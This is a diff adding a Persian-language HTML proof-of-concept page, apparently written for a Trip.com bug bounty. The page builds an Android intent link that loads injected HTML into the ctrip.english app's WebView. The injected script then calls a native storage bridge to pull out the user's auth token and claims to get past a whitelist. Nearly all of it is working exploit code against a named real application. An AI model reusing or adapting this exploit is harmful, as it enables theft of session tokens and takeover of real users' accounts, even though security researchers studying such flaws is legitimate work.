@@ -1,0 +1,60 @@
+<!doctype html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Trip.com Bounty - Final Exploit</title>
+    <style>
+        body { font-family: sans-serif; background: #0d1117; color: white; text-align: center; padding: 50px; }
+        .btn { background: #58a6ff; color: #0d1117; padding: 20px 40px; border-radius: 10px; text-decoration: none; font-weight: bold; font-size: 20px; display: inline-block; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>تست نهایی نفوذ (PoC v8)</h1>
+    <p>برای تست بایپس وایت‌لیست و استخراج توکن، روی دکمه زیر کلیک کنید:</p>
+    
+    <a id="attackLink" class="btn" href="#">شلیک اکسپلویت به اپلیکیشن</a>
+
+    <script>
+        // ۱. این همان کد "خوشگل" توست که قرار است داخل اپلیکیشن اجرا شود
+        const innerPayload = `
+        <!DOCTYPE html>
+        <html>
+        <head><meta charset="UTF-8"></head>
+        <body style="background:#161b22; color:#3fb950; padding:20px; font-family:monospace;">
+            <h1>[!] PIVOT SUCCESSFUL</h1>
+            <div id="result" style="word-break:break-all; border:1px solid #30363d; padding:10px;">در حال استخراج توکن...</div>
+            
+            <script>
+                // تعریف کال‌بک برای دریافت دیتا از جاوا
+                window.__bridge_callback = function(data) {
+                    try {
+                        var decoded = atob(data);
+                        document.getElementById('result').innerHTML = "<b>TOKEN EXFILTRATED:</b><br>" + decoded;
+                    } catch(e) { document.getElementById('result').innerText = "Error decoding: " + e.message; }
+                };
+
+                // فراخوانی متد حساس با رعایت غلط املایی bussiness!
+                setTimeout(() => {
+                    if(window.IBUStorageV2_a) {
+                        window.IBUStorageV2_a.IBUGetUserValue(JSON.stringify({
+                            "bussiness": "common", 
+                            "key": "token",
+                            "callback_tagname": "Storage_token"
+                        }));
+                    } else {
+                        document.getElementById('result').innerText = "Bridge Not Found! (Whitelist Active)";
+                    }
+                }, 2000);
+            <\/script>
+        </body>
+        </html>`;
+
+        // ۲. آماده‌سازی لینک Intent برای شلیک به اپلیکیشن
+        const encodedPayload = encodeURIComponent(innerPayload);
+        const intentURL = `intent:#Intent;scheme=ctripglobal;package=ctrip.english;S.HTML_DATA_TO_LOAD=${encodedPayload};end`;
+
+        // ۳. قرار دادن لینک در دکمه
+        document.getElementById('attackLink').href = intentURL;
+    </script>
+</body>
+</html>
